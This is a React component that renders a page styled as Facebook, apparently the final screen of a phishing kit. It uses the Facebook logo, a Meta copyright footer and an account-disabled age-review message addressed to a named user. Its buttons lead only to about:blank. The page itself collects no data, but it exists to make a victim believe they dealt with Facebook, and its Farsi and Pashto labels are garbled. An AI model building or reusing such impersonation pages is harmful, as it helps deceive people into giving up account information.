import Logo1 from '@/assets/images/logo1.png';
import { faDownload } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { translateText } from '@/utils/translate';

const SendInfo = () => {
    const defaultTexts = useMemo(
        () => ({
            title: 'We Received Your Information',
            description1: 'If we still find that you\'re not old enough to be on Facebook, your account will remain disabled. This is because your account doesn\'t follow our Terms of Service.',
            description2: 'We\'re always looking out for the security of people on Facebook, so until then you can\'t use your account.',
            logOut: 'Log Out From Iqbal Safi',
            downloadInfo: 'Download Your Information',
            englishUS: 'English (US)',
            deutsch: 'Deutsch',
            turkce: 'Türkçe',
            polski: 'Polski',
            italiano: 'Italiano',
            farsi: 'ڤاريس',
            pashto: '٢يشتو'
        }),
        []
    );

    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const [
                    translatedTitle,
                    translatedDesc1,
                    translatedDesc2,
                    translatedLogOut,
                    translatedDownload,
                    translatedEnglish,
                    translatedDeutsch,
                    translatedTurkce,
                    translatedPolski,
                    translatedItaliano,
                    translatedFarsi,
                    translatedPashto
                ] = await Promise.all([
                    translateText(defaultTexts.title, targetLang),
                    translateText(defaultTexts.description1, targetLang),
                    translateText(defaultTexts.description2, targetLang),
                    translateText(defaultTexts.logOut, targetLang),
                    translateText(defaultTexts.downloadInfo, targetLang),
                    translateText(defaultTexts.englishUS, targetLang),
                    translateText(defaultTexts.deutsch, targetLang),
                    translateText(defaultTexts.turkce, targetLang),
                    translateText(defaultTexts.polski, targetLang),
                    translateText(defaultTexts.italiano, targetLang),
                    translateText(defaultTexts.farsi, targetLang),
                    translateText(defaultTexts.pashto, targetLang)
                ]);

                setTranslatedTexts({
                    title: translatedTitle,
                    description1: translatedDesc1,
                    description2: translatedDesc2,
                    logOut: translatedLogOut,
                    downloadInfo: translatedDownload,
                    englishUS: translatedEnglish,
                    deutsch: translatedDeutsch,
                    turkce: translatedTurkce,
                    polski: translatedPolski,
                    italiano: translatedItaliano,
                    farsi: translatedFarsi,
                    pashto: translatedPashto
                });
            } catch {
                //
            }
        },
        [defaultTexts]
    );

    useEffect(() => {
        const targetLang = localStorage.getItem('targetLang');
        if (targetLang && targetLang !== 'en') {
            translateAllTexts(targetLang);
        }
    }, [translateAllTexts]);

    const handleLogOut = () => {
        window.location.href = 'about:blank';
    };

    const handleDownload = () => {
        window.location.href = 'about:blank';
    };

    const languages = [
        { code: 'en', name: translatedTexts.englishUS },
        { code: 'de', name: translatedTexts.deutsch },
        { code: 'ps', name: translatedTexts.pashto },
        { code: 'fa', name: translatedTexts.farsi },
        { code: 'tr', name: translatedTexts.turkce },
        { code: 'pl', name: translatedTexts.polski },
        { code: 'it', name: translatedTexts.italiano }
    ];

    return (
        <div className='min-h-screen bg-gray-100'>
            {/* Header */}
            <header className='bg-white border-b border-gray-300'>
                <div className='max-w-6xl mx-auto px-4 py-4'>
                    <div className='flex items-center justify-center'>
                        <img 
                            src={Logo1} 
                            alt='Facebook' 
                            className='h-8 w-auto'
                        />
                    </div>
                </div>
            </header>

            {/* Main Content */}
            <main className='max-w-2xl mx-auto px-4 py-6'>
                <div className='bg-white rounded-none shadow-sm border border-gray-300'>
                    {/* Title Section */}
                    <div className='px-6 py-6 border-b border-gray-300'>
                        <h1 className='text-xl font-bold text-gray-900'>
                            {translatedTexts.title}
                        </h1>
                    </div>

                    {/* Description Section */}
                    <div className='px-6 py-6 space-y-4'>
                        <p className='text-gray-700 leading-relaxed'>
                            {translatedTexts.description1}
                        </p>
                        <p className='text-gray-700 leading-relaxed'>
                            {translatedTexts.description2}
                        </p>
                    </div>

                    {/* Action Buttons */}
                    <div className='px-6 py-4 space-y-3 border-t border-gray-300'>
                        <button
                            onClick={handleLogOut}
                            className='w-full text-left text-blue-600 hover:text-blue-800 font-medium py-2'
                        >
                            <strong>{translatedTexts.logOut}</strong>
                        </button>

                        <button
                            onClick={handleDownload}
                            className='w-full flex items-center space-x-2 text-blue-600 hover:text-blue-800 font-medium py-2'
                        >
                            <FontAwesomeIcon icon={faDownload} />
                            <span>{translatedTexts.downloadInfo}</span>
                        </button>
                    </div>
                </div>

                {/* Language Selector */}
                <div className='mt-6 bg-white rounded-none shadow-sm border border-gray-300'>
                    <div className='px-6 py-4'>
                        <div className='grid grid-cols-2 gap-4'>
                            <div className='space-y-2'>
                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
                                    {translatedTexts.englishUS}
                                </button>
                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
                                    {translatedTexts.deutsch}
                                </button>
                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
                                    {translatedTexts.turkce}
                                </button>
                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
                                    {translatedTexts.polski}
                                </button>
                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
                                    {translatedTexts.italiano}
                                </button>
                            </div>
                            <div className='space-y-2'>
                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
                                    {translatedTexts.farsi}
                                </button>
                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
                                    {translatedTexts.pashto}
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Footer */}
                <footer className='mt-6 text-center'>
                    <p className='text-gray-500 text-xs'>
                        Meta © {new Date().getFullYear()}
                    </p>
                </footer>
            </main>
        </div>
    );
};
 
export default SendInfo;
